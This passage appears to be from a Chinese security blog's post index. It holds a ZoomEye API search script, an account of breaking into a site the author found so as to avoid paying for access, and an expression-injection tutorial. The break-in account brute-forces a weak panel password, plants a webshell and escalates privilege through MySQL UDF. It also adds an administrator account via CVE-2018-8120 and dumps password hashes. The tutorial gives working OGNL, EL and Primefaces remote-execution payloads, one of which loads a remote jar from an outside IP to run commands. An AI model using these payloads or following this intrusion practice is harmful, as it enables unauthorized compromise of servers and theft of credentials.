不过值得一提的就是上午电脑管家还不能查杀，下午就全国联保了，应该是上传可疑文件云端检测了，不过既然没有查杀也没有报可疑，为什么会上传检测，倒是一个问题。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"zoomeye接口实现","slug":"zoomeye接口实现","date":"2018-09-18T04:44:29.000Z","updated":"2018-09-20T04:35:56.085Z","comments":true,"path":"2018/09/zoomeye接口实现/","link":"","permalink":"/2018/09/zoomeye接口实现/","excerpt":"","text":"zoomeye的接口网上不少人做过实现，之前在学python的json信息处理，便写了这个一个利用脚本，唯一的坑就是wiki和返回信息不一样，浪费了点时间。没有多少难度，就是写了不少提示符，用来多次和提示输入。 #coding:utf-8 #author:misaki import requests import json import re def geturl(): app = raw_input(&#39;app:&#39;) app2 = input(&#39;page:&#39;) app3 = raw_input(&#39;country:&#39;) for i in xrange(1,app2+1): i=str(i) url=&#39;https://api.zoomeye.org/web/search?query=app:&#39;+app+&#39;&amp;page=&#39;+i+&#39;&amp;country=&#39;+app3 r2=requests.get(url,headers=headers) soup = r2.text a=json.loads(soup) #获取site for i in a[&#39;matches&#39;]: f=open(app+&#39;.txt&#39;,&#39;a&#39;) f.write(str(i[&#39;site&#39;])+&#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;web.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getip(): app4 = raw_input(&#39;app:&#39;) app5 = input(&#39;page:&#39;) app6 = raw_input(&#39;country:&#39;) for i in xrange(1, app5 + 1): i = str(i) url = &#39;https://api.zoomeye.org/host/search?query=&#39; + app4 + &#39;&amp;page=&#39; + i +&#39;&amp;country=&#39; + app6 r2 = requests.get(url, headers=headers) parrten = re.compile(r&#39;(?&lt;![\\.\\d])(?:\\d{1,3}\\.){3}\\d{1,3}(?![\\.\\d])&#39;) #获取ip ip = parrten.findall(str(r2.text)) for i in ip: f = open(app4+&#39;.txt&#39;, &#39;a&#39;) f.write(str(i) + &#39;\\n&#39;) f.close print &#39;All url number: %s&#39; % len(open(r&quot;host.txt&quot;, &#39;rU&#39;).readlines()) print &#39;\\r&#39; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) while zoom not in [&#39;y&#39;,&#39;n&#39;,&#39;Y&#39;,&#39;N&#39;]: print &quot;Please enter the specified letter!&quot; zoom = raw_input(&#39;Are you continue?[y/n]:&#39;) print &#39;\\r&#39; if zoom in [&#39;y&#39;,&#39;Y&#39;]: main() def getuser(): url = &#39;https://api.zoomeye.org/resources-info&#39; r2 = requests.get(url, headers=headers) soup = json.loads(r2.text) print &#39;\\r&#39; print &#39;plan: %s&#39; %soup[&#39;plan&#39;] print &#39;search_num: %s&#39; %soup[&#39;resources&#39;][&#39;search&#39;] print &#39;stats: %s&#39; %soup[&#39;resources&#39;][&#39;stats&#39;] def main(): print &#39;Input service number&#39; print &#39;1 - web_search&#39; print &#39;2 - host_search&#39; print &#39;3 - resources_info&#39; name = raw_input(&#39;input num:&#39;) print &#39;\\r&#39; while name not in [&#39;1&#39;,&#39;2&#39;,&#39;3&#39;]: name = raw_input(&#39;input num:&#39;) if name != &#39;&#39;: try: if name == &#39;1&#39;: geturl() elif name == &#39;2&#39;: getip() elif name == &#39;3&#39;: getuser() except: pass if __name__==&#39;__main__&#39;: print &#39;#######&#39; print &#39; # #### #### # # ###### # # ######&#39; print &#39; # # # # # ## ## # # # # &#39; print &#39; # # # # # # ## # ##### # ##### &#39; print &#39; # # # # # # # # # # &#39; print &#39; # # # # # # # # # # &#39; print &#39;####### #### #### # # ###### # ######&#39; print &#39;auther:misaki&#39; print &#39;\\r&#39; print &#39;Input your username and password&#39; username = raw_input(&#39;username:&#39;) password = raw_input(&#39;password:&#39;) print &#39;\\r&#39; if username and password != -1: data = {&quot;username&quot;: username, &quot;password&quot;: password} s = json.dumps(data, indent=4) r = requests.post(&#39;https://api.zoomeye.org/user/login&#39;, data=s) if r.status_code == 200: token = r.text headers = {&#39;Authorization&#39;: &#39;JWT&#39; + &#39; &#39; + token[18:-2]} main() else: print &#39;Incorrect username or password&#39; ​​","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"对意外发现的某站点测试","slug":"对意外发现的某站点测试","date":"2018-09-18T04:43:59.000Z","updated":"2018-09-20T04:37:09.019Z","comments":true,"path":"2018/09/对意外发现的某站点测试/","link":"","permalink":"/2018/09/对意外发现的某站点测试/","excerpt":"","text":"朋友分享一个站点，点开需要购买点卡，本着节约的原则，简单做了一个测试，于是便有了下文 爆破宝塔系统，页面提示三次错误将出现验证码，那么如何记录错误次数，猜测是通过cookie，删除cookie 弱口令爆破成功，进入宝塔后台 从宝塔后台获取phpmyadmin，root权限 同样可以看到文件系统，但只能看到网站目录，宝塔系统提示，从宝塔建站，默认user权限 上传shell，同样是只能看到当前网站目录 考虑通过phpmyadmin提权，发现系统禁止root外连，虽然没有必要，但还是尝试开启外连，用navicat连接数据库接管，用户中找到root用户，编辑权限，开启任意主机链接 采用udf提权，提权的话需要写入导出权限，但是由于权限设置不能导入导出 因为mysql对通过文件导入导出作了限制，默认不允许。默认value值为null，则为禁止，如果有文件夹目录，则只允许改目录下文件 通常操作为以下步骤，但是没有写权限，有了上传权限更方便操作，直接跳过udf导出步骤： Udf需要导出到\\lib\\plugin目录，一般该目录不存在\\lib\\plugin目录。 可以尝试利用NTFS ADS创建 plugin目录 查询 select &#39;xxx&#39; into dumpfile &#39;C:\\\\MySQL\\\\lib::$INDEX_ALLOCATION&#39;; 导出UDF.DLL 随便选一个库 查询 CREATE TABLE Temp_udf(udf BLOB); 查询 INSERT into Temp_udf values (CONVERT($shellcode,CHAR)); 查询 SELECT udf FROM Temp_udf INTO DUMPFILE &#39;C:\\\\MySQL\\\\lib\\\\plugin\\\\udf.dll&#39;;-- 查询 Create function cmdshell returns string soname &#39;udf.dll&#39;; 查询 select * from mysql.func; 查询 select cmdshell(&#39;net user test test /add&#39;); ​ 手动创建plugin目录，上传udf.dll文件，执行以上sql代码，创建账号，拿下服务器 利用Cve-2018-8120创建账号完成添加管理员 导出hash，利用Pwdump7 这个过程遇到一个问题就是，菜刀下模拟终端无法使用，目录只能看到网站目录，导致一段时间内以为是权限问题，而磁盘下的目录又只是一个网站目录，加深这种认识，拿下服务器的时候才发现是想多了，只有那一个目录。。。","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"表达式注入","slug":"表达式注入","date":"2018-09-18T04:29:45.000Z","updated":"2018-09-20T04:36:56.198Z","comments":true,"path":"2018/09/表达式注入/","link":"","permalink":"/2018/09/表达式注入/","excerpt":"","text":"在一次项目中发现了一个泛微的历史老洞，而且是表达式注入中典型的一种，特地收集了相关资料做一份表达式注入的文档和记录 表达式注入概念：2013年4月15日Expression Language Injection词条在OWASP上被创建，而这个词的最早出现可以追溯到2012年12月的《Remote-Code-with-Expression-Language-Injection》一文，在这个paper中第一次提到了这个名词。 而这个时期，只不过还只是把它叫做远程代码执行漏洞、远程命令执行漏洞或者上下文操控漏洞。像Struts2系列的s2-003、s2-009、s2-016等，这种由OGNL表达式引起的命令执行漏洞。 流行的表达式语言：Struts2——OGNL实至名归的“漏洞之王”，表达式的格式: ​ @[类全名（包括包路径）]@[方法名 | 值名]，例如： ​ @java.lang.String@format(&#39;foo %s&#39;, &#39;bar&#39;) 基本用法： java ActionContext AC = ActionContext.getContext(); Map Parameters = (Map)AC.getParameters(); String expression = &quot;${(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()}&quot;; AC.getValueStack().findValue(expression)); 相关漏洞： s2-009、s2-012、s2-013、s2-014、s2-015、s2-016，s2-017 Spring——SPELSPEL即Spring EL，故名思议是Spring框架专有的EL表达式。相对于其他几种表达式语言，使用面相对较窄，但是从Spring框架被使用的广泛性来看，还是有值得研究的价值的。 基本用法： 在jsp页面中可以使用el表达式代替&lt;%=%&gt;，之间访问java对象。 java String expression = &quot;T(java.lang.Runtime).getRuntime().exec(/&quot;calc/&quot;)&quot;; String result = parser.parseExpression(expression).getValue().toString(); JSP——JSTL_EL这种表达式是JSP语言自带的表达式，也就是说所有的Java Web服务都必然会支持这种表达式。但是由于各家对其实现的不同，也导致某些漏洞可以在一些Java Web服务中成功利用，而在有的服务中则是无法利用。 基本用法： jsp &lt;spring:message text=&quot;${/&quot;/&quot;.getClass().forName(/&quot;java.lang.Runtime/&quot;).getMethod(/&quot;getRuntime/&quot;,null).invoke(null,null).exec(/&quot;calc/&quot;,null).toString()}&quot;&gt; &lt;/spring:message&gt; Elasticsearch——MVELElasticsearch的CVE-2014-3120这个漏洞 MVEL是同OGNL和SPEL一样，具有通过表达式执行Java代码的强大功能。 基本用法： java import org.mvel.MVEL; public class MVELTest { ​ public static void main(String[] args) { ​ String expression = &quot;new java.lang.ProcessBuilder(/&quot;calc/&quot;).start();&quot;; ​ Boolean result = (Boolean) MVEL.eval(expression, vars); ​ } } 执行代码：OGNL表达式注入：示例：泛微E-Mobile 表达式获取数据语法：”${标识符}”，但在这个中并不需要${}来包括，不然会执行失败。 先用一个小的加减乘除做验证： 执行exp语句，执行命令whoami， @org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27whoami%27).getInputStream())： 尝试报路径，但此例并不成功 %24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D EL表达式注入：​ 实例：CVE-2011-2730 EL表达式语句在执行时，会调用pageContext.findAttribute方法，用标识符为关键字，分别从page、request、session、application四个域中查找相应的对象，找到则返回相应对象，找不到则返回”” （注意，不是null，而是空字符串）。 EL表达式可以很轻松获取JavaBean的属性，或获取数组、Collection、Map类型集合的数据 EL表达式语言中定义了11个隐含对象，使用这些隐含对象可以很方便地获取web开发中的一些常见对象，并读取这些对象的数据。 语法：${隐式对象名称}：获得对象的引用 序号 隐含对象名称 描述 1 pageContext 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。） 2 pageScope 代表page域中用于保存属性的Map对象 3 requestScope 代表request域中用于保存属性的Map对象 4 sessionScope 代表session域中用于保存属性的Map对象 5 applicationScope 代表application域中用于保存属性的Map对象 6 param 表示一个保存了所有请求参数的Map对象 7 paramValues 表示一个保存了所有请求参数的Map对象，它对于某个请求参数，返回的是一个string[] 8 header 表示一个保存了所有http请求头字段的Map对象，注意：如果头里面有“-” ，例Accept-Encoding，则要header[“Accept-Encoding”] 9 headerValues 表示一个保存了所有http请求头字段的Map对象，它对于某个请求参数，返回的是一个string[]数组。注意：如果头里面有“-” ，例Accept-Encoding，则要headerValues[“Accept-Encoding”] 10 cookie 表示一个保存了所有cookie的Map对象 11 initParam 表示一个保存了所有web应用初始化参数的map对象 语法：${运算表达式}，EL表达式支持如下运算符： 1、关系运算符 2、逻辑运算符： 3、empty运算符：检查对象是否为null(空) 4、二元表达式：${user!=null?user.name :””} 5、[ ] 和 . 号运算符 执行exp语句： ${pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;命令&quot;).getInputStream())} Primefaces框架表达式注入:Primefaces要加密Payload后执行命令，所以这里用打包成jar包的加密函数进行加密! 命令：java -cp .\\de.jar test.EncodeDecode exp 验证(代码): ${facesContext.getExternalContext().getResponse().getWriter().println(&quot;~~~elinject~~~&quot;)}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e/f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we/YPtcrOOmI+/uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT/PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg== Web路径: ${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/&quot;//&quot;))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D 反射式调用执行命令: ${request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}${request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://118.184.23.145/cmd.jar&quot;).toURL())}${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload调用: http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&amp;;ln=primefaces&amp;;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd=ifconfig Spring Boot框架表达式注入漏洞影响Spring Boot版本从1.1-1.3.0 http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{101, 108, 105, 110, 106, 101, 99, 116 })} 内容中出现 elinject就是注入成功","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"新的开始！","slug":"新的开始！","date":"2018-09-17T16:32:10.000Z","updated":"2018-09-20T05:01:02.165Z","comments":true,"path":"2018/09/新的开始！/","link":"","permalink":"/2018/09/新的开始！/","excerpt":"","text":"","categories":[],"tags":[]}]}